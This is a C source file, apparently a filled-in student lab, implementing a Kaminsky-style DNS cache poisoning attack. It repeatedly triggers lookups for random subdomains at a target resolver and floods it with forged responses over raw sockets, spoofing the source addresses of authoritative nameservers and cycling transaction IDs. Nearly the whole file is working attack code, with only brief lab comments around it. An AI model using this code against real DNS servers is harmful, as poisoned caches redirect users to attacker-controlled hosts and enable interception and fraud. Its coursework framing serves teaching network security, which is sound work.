#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

#define MAX_FILE_SIZE 1000000

/* IP Header */
struct ipheader {
  unsigned char iph_ihl : 4,       // IP header length
      iph_ver : 4;                 // IP version
  unsigned char iph_tos;           // Type of service
  unsigned short int iph_len;      // IP Packet length (data + header)
  unsigned short int iph_ident;    // Identification
  unsigned short int iph_flag : 3, // Fragmentation flags
      iph_offset : 13;             // Flags offset
  unsigned char iph_ttl;           // Time to Live
  unsigned char iph_protocol;      // Protocol type
  unsigned short int iph_chksum;   // IP datagram checksum
  struct in_addr iph_sourceip;     // Source IP address
  struct in_addr iph_destip;       // Destination IP address
};

void send_raw_packet(char *buffer, int pkt_size);
void send_dns_request();
// void send_dns_response();
void send_dns_response(unsigned char *pkt, int pktsize, unsigned char *src,
                       char *name, unsigned short id);
int main() {
  srand(time(NULL));

  // Load the DNS request packet from file
  FILE *f_req = fopen("ip_req.bin", "rb");
  if (!f_req) {
    perror("Can't open 'ip_req.bin'");
    exit(1);
  }
  unsigned char ip_req[MAX_FILE_SIZE];
  int n_req = fread(ip_req, 1, MAX_FILE_SIZE, f_req);

  // Load the first DNS response packet from file
  FILE *f_resp = fopen("ip_resp.bin", "rb");
  if (!f_resp) {
    perror("Can't open 'ip_resp.bin'");
    exit(1);
  }
  unsigned char ip_resp[MAX_FILE_SIZE];
  int n_resp = fread(ip_resp, 1, MAX_FILE_SIZE, f_resp);

  char a[26] = "abcdefghijklmnopqrstuvwxyz";
  while (1) {
    // Generate a random name with length 5
    char name[6];
    name[5] = '\0';
    for (int k = 0; k < 5; k++)
      name[k] = a[rand() % 26];

    // ##################################################################
    /* Step 1. Send a DNS request to the targeted local DNS server.
               This will trigger the DNS server to send out DNS queries */
    send_dns_request(name, ip_req, n_req);

    // ... Students should add code here.

    /* Step 2. Send many spoofed responses to the targeted local DNS server,
               each one with a different transaction ID. */
    // send_dns_response(name, ip_resp, n_resp);
    unsigned short transid = 0;
    for (int i = 0; i < 100; i++) {
      send_dns_response(ip_resp, n_resp, "199.43.133.53", name, transid);
      send_dns_response(ip_resp, n_resp, "199.43.135.53", name, transid);
      transid += 1;
    }

    // ... Students should add code here.

    // ##################################################################
  }
}

/* Use for sending DNS request.
 * Add arguments to the function definition if needed.
 * */
void send_dns_request(char *name, char *req_pkt, int pkt_size) {
  // Students need to implement this function
  memcpy(req_pkt + 41, name, 5);
  send_raw_packet(req_pkt, pkt_size);
}

/* Use for sending forged DNS response.
 * Add arguments to the function definition if needed.
 * */
void send_dns_response(unsigned char *pkt, int pktsize, unsigned char *src,
                       char *name, unsigned short id) {
  // the C code will modify src,qname,rrname and the id field
  // src ip at offset 12
  int ip = (int)inet_addr(src);
  memcpy(pkt + 12, (void *)&ip, 4);
  // qname at offset 41
  memcpy(pkt + 41, name, 5);
  // rrname at offset 64
  memcpy(pkt + 64, name, 5);
  // id at offset 28
  unsigned short transid = htons(id);
  memcpy(pkt + 28, (void *)&transid, 2);
  // send the dns reply out
  send_raw_packet(pkt, pktsize);
}
/* Send the raw packet out
 *    buffer: to contain the entire IP packet, with everything filled out.
 *    pkt_size: the size of the buffer.
 * */
void send_raw_packet(char *buffer, int pkt_size) {
  struct sockaddr_in dest_info;
  int enable = 1;

  // Step 1: Create a raw network socket.
  int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

  // Step 2: Set socket option.
  setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(enable));

  // Step 3: Provide needed information about destination.
  struct ipheader *ip = (struct ipheader *)buffer;
  dest_info.sin_family = AF_INET;
  dest_info.sin_addr = ip->iph_destip;

  // Step 4: Send the packet out.
  sendto(sock, buffer, pkt_size, 0, (struct sockaddr *)&dest_info,
         sizeof(dest_info));
  close(sock);
}
